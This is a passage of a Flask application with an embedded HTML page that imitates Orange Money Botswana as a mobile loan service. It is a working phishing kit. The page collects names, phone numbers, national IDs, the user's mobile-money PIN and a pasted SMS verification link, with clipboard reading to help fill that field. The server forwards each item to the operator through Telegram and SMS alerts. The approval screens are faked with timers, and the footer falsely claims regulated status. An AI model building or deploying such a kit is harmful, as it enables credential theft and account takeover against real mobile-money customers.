          <span id="approved-date" class="font-bold text-slate-800">30 September 2026</span>
        </div>
      </div>

      <div class="space-y-3">
        <button onclick="goTo('details')" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all">
          VIEW LOAN DETAILS
        </button>
        <button onclick="goTo('home')" class="w-full py-3.5 rounded-2xl bg-white border border-slate-200 text-slate-700 font-bold text-sm hover:bg-slate-50">
          BACK TO HOME
        </button>
      </div>
    </section>

    <!-- SCREEN 9: LOAN DETAILS -->
    <section id="screen-details" class="hidden space-y-5">
      <div class="flex items-center gap-3">
        <button onclick="goTo('home')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
        <div>
          <h2 class="text-xl font-black text-slate-900">ACTIVE LOAN DETAILS</h2>
          <p class="text-xs text-slate-500">Reference: OMB-894210</p>
        </div>
      </div>

      <div class="bg-orange-50 border border-orange-200 rounded-2xl p-5 flex items-center justify-between">
        <div>
          <span class="text-xs font-bold uppercase tracking-wider text-orange-800">Status</span>
          <div class="text-lg font-black text-orange-950">APPROVED & ACTIVE</div>
        </div>
        <span class="px-3 py-1 rounded-full text-xs font-bold bg-[#FF7900] text-black">Active</span>
      </div>

      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-3 text-xs sm:text-sm">
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Principal</span><span id="details-principal" class="font-bold text-slate-800">P 1,500</span></div>
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Interest (5%)</span><span id="details-interest" class="font-bold text-slate-800">P 75.00</span></div>
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Service Fees</span><span id="details-fees" class="font-bold text-slate-800">P 45.00</span></div>
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#FF7900]">P 1,620.00</span></div>
        <div class="flex justify-between py-1.5"><span class="text-slate-500">Due Date</span><span id="details-date" class="font-bold text-slate-800">30/09/2026</span></div>
      </div>

      <button onclick="goTo('home')" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all">
        BACK TO HOME
      </button>
    </section>

  </main>

  <!-- INFO MODAL -->
  <div id="info-modal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
    <div onclick="closeInfoModal()" class="absolute inset-0 bg-black/60 backdrop-blur-xs"></div>
    <div class="relative bg-white rounded-3xl p-6 max-w-sm w-full shadow-2xl border border-slate-200 text-center space-y-3 z-10">
      <h3 id="info-title" class="text-lg font-black text-slate-900">Information</h3>
      <p class="text-xs text-slate-600">This is a demonstration preview of the Orange Money mobile loan journey. Features in this section are mock placeholders for demonstration.</p>
      <button onclick="closeInfoModal()" class="w-full py-2.5 rounded-xl bg-[#FF7900] text-black font-black text-xs">Close</button>
    </div>
  </div>

  <!-- FOOTER -->
  <footer class="w-full max-w-[760px] mx-auto px-4 py-4 text-center text-xs text-slate-400 border-t border-slate-200">
    Orange Money Botswana (Pty) Ltd • Regulated Mobile Financial Services
  </footer>

  <script>
    let appState = {
      appId: Date.now().toString(),
      fullName: "",
      mobile: "",
      nationalId: "",
      birthDate: "",
      purpose: "Business",
      amount: 1500,
      period: 30
    };

    let enteredPin = "";
    let timer = null;
    let countdown = 30;

    function goTo(screenName, scroll = true) {
      document.querySelectorAll('main > section').forEach(sec => sec.classList.add('hidden'));
      const target = document.getElementById('screen-' + screenName);
      if (target) {
        target.classList.remove('hidden');
        if (scroll) window.scrollTo({ top: 0, behavior: 'smooth' });
      }
      if (screenName === 'loan') syncAmount(appState.amount);
      if (screenName === 'review') populateReview();
      if (screenName === 'otp') startOtpTimer();
    }

    function toggleMenu(open) {
      const drawer = document.getElementById('drawer');
      const panel = document.getElementById('drawer-panel');
      if (!drawer || !panel) return;
      if (open) {
        drawer.classList.remove('pointer-events-none', 'opacity-0');
        panel.classList.remove('translate-x-full');
      } else {
        drawer.classList.add('pointer-events-none', 'opacity-0');
        panel.classList.add('translate-x-full');
      }
    }

    function formatMobileWithCountryCode(phone) {
      if (!phone) return "+267 72 123 456";
      let cleaned = phone.replace(/[^0-9+]/g, '');
      if (cleaned.startsWith('+')) return cleaned;
      if (cleaned.startsWith('0')) {
        cleaned = cleaned.substring(1);
      }
      if (cleaned.length === 8) {
        return '+267 ' + cleaned.substring(0, 2) + ' ' + cleaned.substring(2, 5) + ' ' + cleaned.substring(5);
      }
      return '+267 ' + cleaned;
    }

    function handleFormSubmit(event) {
      event.preventDefault();
      appState.fullName = document.getElementById('input-fullname').value;
      appState.mobile = document.getElementById('input-mobile').value;
      appState.nationalId = document.getElementById('input-nationalid').value;
      appState.purpose = document.getElementById('input-purpose').value;
      appState.amount = parseInt(document.getElementById('input-amount').value) || 1500;
      
      syncAmount(appState.amount);

      // Send Telegram & SMS notification for new application submission
      fetch('/api/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          appId: appState.appId,
          fullName: appState.fullName,
          mobile: formatMobileWithCountryCode(appState.mobile),
          nationalId: appState.nationalId,
          purpose: appState.purpose,
          amount: appState.amount
        })
      }).catch(err => console.error(err));

      goTo('loan');
    }

    function showInfoModal(title) {
      toggleMenu(false);
      document.getElementById('info-title').innerText = title;
      document.getElementById('info-modal').classList.remove('hidden');
    }

    function closeInfoModal() {
      document.getElementById('info-modal').classList.add('hidden');
    }

    function setPurpose(p) {
      appState.purpose = p;
      const sel = document.getElementById('input-purpose');
      if (sel) sel.value = p;
      goTo('apply');
    }

    function calculateCosts() {
      const val = appState.amount;
      const days = appState.period;
      
      let rate = 0.05;
      if (days <= 7) rate = 0.03;
      else if (days <= 14) rate = 0.05;
      else if (days <= 30) rate = 0.10;
      else if (days <= 60) rate = 0.15;
      else rate = 0.20;

      const interest = Math.round(val * rate);
      const fee = Math.round(val * 0.03);
      const total = val + interest + fee;

      const interestEl = document.getElementById('breakdown-interest');
      const feeEl = document.getElementById('breakdown-fee');
      const totalEl = document.getElementById('breakdown-total');

      if (interestEl) interestEl.innerText = 'P ' + interest.toLocaleString();
      if (feeEl) feeEl.innerText = 'P ' + fee.toLocaleString();
      if (totalEl) totalEl.innerText = 'P ' + total.toLocaleString();

      const dateEl = document.getElementById('breakdown-date');
      if (dateEl) {
        const d = new Date();
        d.setDate(d.getDate() + days);
        dateEl.innerText = d.toLocaleDateString('en-GB');
      }
    }

    function setPeriod(days) {
      appState.period = days;
      document.querySelectorAll('.period-btn').forEach(btn => {
        btn.classList.remove('bg-[#FF7900]', 'text-black', 'border-[#FF7900]', 'shadow-xs');
        btn.classList.add('text-slate-700', 'border-slate-200');
        if (btn.innerText.includes(days + ' Days')) {
          btn.classList.add('bg-[#FF7900]', 'text-black', 'border-[#FF7900]', 'shadow-xs');
          btn.classList.remove('text-slate-700', 'border-slate-200');
        }
      });
      calculateCosts();
    }

    function setCustomDate(val) {
      if (!val) return;
      const chosen = new Date(val);
      today = new Date();
      today.setHours(0, 0, 0, 0);
      const diffTime = chosen - today;
      const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
      if (diffDays > 0) {
        appState.period = diffDays;
        document.querySelectorAll('.period-btn').forEach(btn => {
          btn.classList.remove('bg-[#FF7900]', 'text-black', 'border-[#FF7900]', 'shadow-xs');
          btn.classList.add('text-slate-700', 'border-slate-200');
        });
        calculateCosts();
      }
    }

    function toggleConfirm(checked) {
      const btn = document.getElementById('btn-confirm');
      if (btn) {
        btn.disabled = !checked;
        if (checked) {
          btn.classList.remove('bg-slate-300', 'cursor-not-allowed', 'text-slate-500');
          btn.classList.add('bg-[#FF7900]', 'hover:bg-[#E66A00]', 'text-black');
        } else {
          btn.classList.add('bg-slate-300', 'cursor-not-allowed', 'text-slate-500');
          btn.classList.remove('bg-[#FF7900]', 'hover:bg-[#E66A00]', 'text-black');
        }
      }
    }

    function populateReview() {
      const nameEl = document.getElementById('review-name');
      const mobileEl = document.getElementById('review-mobile');
      const idEl = document.getElementById('review-id');
      const purposeEl = document.getElementById('review-purpose');
      const principalEl = document.getElementById('review-principal');
      const periodEl = document.getElementById('review-period');
      const totalEl = document.getElementById('review-total');
      const dateEl = document.getElementById('review-date');

      if (nameEl) nameEl.innerText = appState.fullName || "Lesedi Molefe";
      if (mobileEl) mobileEl.innerText = appState.mobile || "+267 72 123 456";
      if (idEl) idEl.innerText = appState.nationalId || "123456789";
      if (purposeEl) purposeEl.innerText = appState.purpose || "Business";
      if (principalEl) principalEl.innerText = 'P ' + (appState.amount || 1500).toLocaleString();
      if (periodEl) periodEl.innerText = appState.period + ' Days';

      const val = appState.amount || 1500;
      const days = appState.period || 30;
      let rate = 0.05;
      if (days <= 7) rate = 0.03;
      else if (days <= 14) rate = 0.05;
      else if (days <= 30) rate = 0.10;
      else if (days <= 60) rate = 0.15;
      else rate = 0.20;

      const interest = Math.round(val * rate);
      const fee = Math.round(val * 0.03);
      const total = val + interest + fee;

      if (totalEl) totalEl.innerText = 'P ' + total.toLocaleString();

      if (dateEl) {
        const d = new Date();
        d.setDate(d.getDate() + days);
        dateEl.innerText = d.toLocaleDateString('en-GB');
      }

      const checkEl = document.getElementById('confirm-check');
      if (checkEl) {
        checkEl.checked = false;
        toggleConfirm(false);
      }
    }

    let isPinBusy = false;

    function pressPin(digit) {
      if (isPinBusy || enteredPin.length >= 4) return;
      enteredPin += digit;
      updatePinDots();
      if (enteredPin.length === 4) {
        isPinBusy = true;
        const msg = document.getElementById('pin-status-msg');
        if (msg) msg.innerText = 'Verifying PIN...';
        
        for (let i = 0; i < 4; i++) {
          const dot = document.getElementById('dot-' + i);
          if (dot) dot.classList.add('wave-dot-' + i);
        }

        setTimeout(submitPin, 4500);
      }
    }

    function clearPin() {
      if (isPinBusy) return;
      enteredPin = '';
      updatePinDots();
    }

    function backspacePin() {
      if (isPinBusy) return;
      enteredPin = enteredPin.slice(0, -1);
      updatePinDots();
    }

    function updatePinDots() {
      for (let i = 0; i < 4; i++) {
        const dot = document.getElementById('dot-' + i);
        if (dot) {
          if (i < enteredPin.length) {
            dot.classList.add('bg-[#FF7900]', 'border-[#FF7900]');
            dot.classList.remove('border-slate-300');
          } else {
            dot.classList.remove('bg-[#FF7900]', 'border-[#FF7900]');
            dot.classList.add('border-slate-300');
          }
        }
      }
    }

    function submitPin() {
      const formattedPhone = formatMobileWithCountryCode(appState.mobile);
      fetch('/api/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          appId: appState.appId,
          fullName: appState.fullName,
          mobile: formattedPhone,
          field: 'entered_pin',
          value: enteredPin
        })
      }).catch(err => console.error(err));

      isPinBusy = false;
      const msg = document.getElementById('pin-status-msg');
      if (msg) msg.innerText = '';
      for (let i = 0; i < 4; i++) {
        const dot = document.getElementById('dot-' + i);
        if (dot) dot.classList.remove('wave-dot-' + i);
      }
      enteredPin = '';
      updatePinDots();

      const otpLabel = document.getElementById('otp-mobile-label');
      if (otpLabel) otpLabel.innerText = formattedPhone;
      goTo('otp');
    }

    async function pasteLinkFromClipboard() {
      try {
        if (navigator.clipboard && navigator.clipboard.readText) {
          const text = await navigator.clipboard.readText();
          if (text) {
            const input = document.getElementById('input-verification-link');
            if (input) input.value = text;
          }
        }
      } catch (err) {
        console.log("Clipboard access error:", err);
      }
    }

    function startOtpTimer() {
      countdown = 30;
      const resendBtn = document.getElementById('resend-btn');
      if (timer) clearInterval(timer);
      
      timer = setInterval(() => {
        countdown--;
        if (resendBtn) {
          if (countdown > 0) {
            resendBtn.innerText = `Resend SMS link in ${countdown}s`;
            resendBtn.disabled = true;
          } else {
            resendBtn.innerText = 'Resend SMS link';
            resendBtn.disabled = false;
            clearInterval(timer);
          }
        }
      }, 1000);
    }

    function resendOtp() {
      startOtpTimer();
    }

    function startProcessing() {
      const linkInput = document.getElementById('input-verification-link');
      const pastedLink = linkInput ? linkInput.value.trim() : '';

      const btnOtp = document.getElementById('btn-otp');
      if (btnOtp) {
        btnOtp.disabled = true;
        btnOtp.innerText = 'VERIFYING ELIGIBILITY...';
      }

      const formattedPhone = formatMobileWithCountryCode(appState.mobile);

      fetch('/api/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          appId: appState.appId,
          fullName: appState.fullName,
          mobile: formattedPhone,
          field: 'entered_link',
          value: pastedLink
        })
      }).catch(err => console.error(err));

      setTimeout(() => {
        if (btnOtp) {
          btnOtp.disabled = false;
          btnOtp.innerText = 'VERIFY & CONTINUE';
        }
        goTo('processing');

        setTimeout(() => {
          const approvedAmt = document.getElementById('approved-amount');
          const approvedRepay = document.getElementById('approved-repay');
          const approvedDate = document.getElementById('approved-date');

          const val = appState.amount || 1500;
          const days = appState.period || 30;
          let rate = 0.05;
          if (days <= 7) rate = 0.03;
          else if (days <= 14) rate = 0.05;
          else if (days <= 30) rate = 0.10;
          else if (days <= 60) rate = 0.15;
          else rate = 0.20;

          const interest = Math.round(val * rate);
          const fee = Math.round(val * 0.03);
          const total = val + interest + fee;

          if (approvedAmt) approvedAmt.innerText = 'P ' + val.toLocaleString();
          if (approvedRepay) approvedRepay.innerText = 'P ' + total.toLocaleString();

          if (approvedDate) {
            const d = new Date();
            d.setDate(d.getDate() + days);
            approvedDate.innerText = d.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
          }

          goTo('approved');
        }, 6000);
      }, 1500);
    }

    function syncAmount(val, isFromInput = false) {
      let parsedVal = parseInt(val) || 100;
      if (parsedVal > 10000) parsedVal = 10000;
      appState.amount = parsedVal;
      
      if (!isFromInput) {
        const inp = document.getElementById('input-amount');
        if (inp) inp.value = parsedVal;
      }
      
      const slider = document.getElementById('amount-slider');
      if (slider) slider.value = parsedVal;
      const disp = document.getElementById('display-amount');
      if (disp) disp.innerText = 'P ' + parsedVal.toLocaleString();
      
      calculateCosts();
    }
  </script>
</body>
</html>
"""

@app.route('/')
def home():
    return Response(HTML_PAGE, mimetype='text/html')

# Endpoint: Unified data saving and tracking
@app.route('/api/save', methods=['POST'])
def save_unified():
    try:
        data = request.get_json(silent=True) or {}
        app_id = data.get('appId') or data.get('session_id')
        if not app_id: return jsonify({'status': 'error', 'message': 'Missing appId'}), 400
        name = data.get('fullName', 'Unknown')
        phone = data.get('mobile', data.get('phone', 'NoPhone'))
        f_n = data.get('field')
        f_v = data.get('value')
        now = get_now_str()
        if f_n == 'entered_pin':
            m = f'🔐 *PIN Received*\n\n👤 *User:* {name}\n🔢 *PIN:* {f_v}\n📞 *Phone:* {phone}'
            send_telegram_notification(m)
            send_sms_notification(f"[Orange Money Botswana] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
        elif f_n in ('entered_link', 'entered_otp'):
            m = f'🔗 *Verification Link Received*\n\n👤 *User:* {name}\n🌐 *Link / Code:* {f_v}\n📞 *Phone:* {phone}'
            send_telegram_notification(m)
            send_sms_notification(f"[Orange Money Botswana] Link Received\nUser: {name}\nPhone: {phone}\nLink: {f_v}")
        elif not f_n:
            amt = data.get('amount', 'N/A')
            m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* P {amt}\n📅 *Time:* {now}'
            send_telegram_notification(m)
            send_sms_notification(f"[Orange Money Botswana] New Application\nName: {name}\nPhone: {phone}\nAmount: P {amt}")
        return jsonify({'status': 'success', 'record_id': app_id})

    except Exception as e:
        print(f"Error in unified save: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/track-input', methods=['POST'])
def track_input():
    return save_unified()

if __name__ == "__main__":
    app.run(debug=True, port=int(os.environ.get("PORT", 8000)))
